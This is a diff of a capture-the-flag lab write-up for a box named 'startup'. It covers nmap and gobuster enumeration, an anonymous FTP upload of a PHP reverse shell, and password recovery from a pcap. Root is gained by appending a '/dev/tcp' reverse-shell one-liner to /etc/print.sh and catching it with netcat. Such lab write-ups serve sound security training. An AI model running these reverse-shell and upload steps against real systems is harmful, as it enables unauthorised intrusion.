@@ -1,8 +1,7 @@
-IP `10.10.241.74`
-&nbsp;
-&nbsp;
+#### IP `10.10.241.74`
 
-1. First of all and as always we run nmap:
+
+#### 1. First of all and as always we run nmap:
 ```
 ──(kali㉿kali)-[~]
 └─$ nmap -Pn -A -T4 10.10.241.74
@@ -60,10 +59,10 @@ These ports are open:
 ```
 
 
-2. Secondly, it is always good to run gobuster to get a list of directories available and also check `/robots.txt` 
+#### 2. Secondly, it is always good to run gobuster to get a list of directories available and also check `/robots.txt` 
 
- ```
- gobuster dir -u http://10.10.241.74 -w /usr/share/wordlists/dirb/common.txt ===============================================================
+```
+sgobuster dir -u http://10.10.241.74 -w /usr/share/wordlists/dirb/common.txt ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
@@ -91,7 +90,7 @@ It seems that there is a directory `/files` however, after a quick look there is
                                                                        
 
 
-3. We come back to ftp port.
+#### 3. We come back to ftp port.
 
 We login as `Anonymous` and tap enter while prompted for password. Command `dir` shows available files (with no useful informations) but there is also `ftp` directory where anonymous user has writing permission.
 
@@ -103,13 +102,14 @@ In this case we will try to get a shell with netcat and reverse php:
 - open `http://10.10.241.74/files/ftp/shell.php` in a browser, click on it and get shell as `www-data`
 
 There is a file called recipe.txt, so quick `cat` to answer first question:
-
+```
 ww-data@startup:/$ cat recipe.txt
 cat recipe.txt
 Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was XXXX
+```
 
 
-4. Indicents directory
+#### 4. Indicents directory
 
 Besides `recipe.txt` there is a directory named `incidents`
 
@@ -161,7 +161,7 @@ drwxr-xr-x 25 root     root     4.0K Jan 10 18:52 ..
 -rwxr-xr-x  1 www-data www-data  31K Nov 12 04:53 suspicious.pcapng
 ```
 
-5. Investigating the file.
+#### 5. Investigating the file.
 
 I quickly run a python http server `python3 -m http.server` and downloade a file to my local machine, as there is no `strings` command installed on a box.
 
@@ -198,15 +198,13 @@ www-data@startup:/home$ |
 A giant file with some logs. Once we have a deeper look at it, among  different commands there is a username `lennie` and passswordlike word, which in the end turns out to ba that user's pass (it is very illogic for me)
 
 
-6. Enumaration while logged as `lennie`
+#### 6. Enumaration while logged as `lennie`
 
 I run `linpeas.sh` in order to get some useful informations, however did not find anything. 
 
 Our user `lennie` has permissions to run `/etc/print.sh` script so by appending a reverse shell onliner and running netcat, there is a chance to get another shell as root.
 
 I type `echo "bash -i &>/dev/tcp/$MYIP/$NCPORT <&1" >> /etc/print.sh`
-
-wait a little and bingo:
 
 ```
 lennie@startup:~$ echo "bash -i &>/dev/tcp/10.6.46.150/4444 <&1" >> /etc/print.s 
@@ -216,7 +214,11 @@ echo "Done!"
 bash -i &>/dev/tcp/10.6.46.150/4444 <&1
 lennie@startup:~$ 
 
+```
 
+wait a little and bingo:
+
+```
 ──(kali㉿kali)-[~]
 └─$ sudo nc -lvnp 4444
 [sudo] password for kali: 
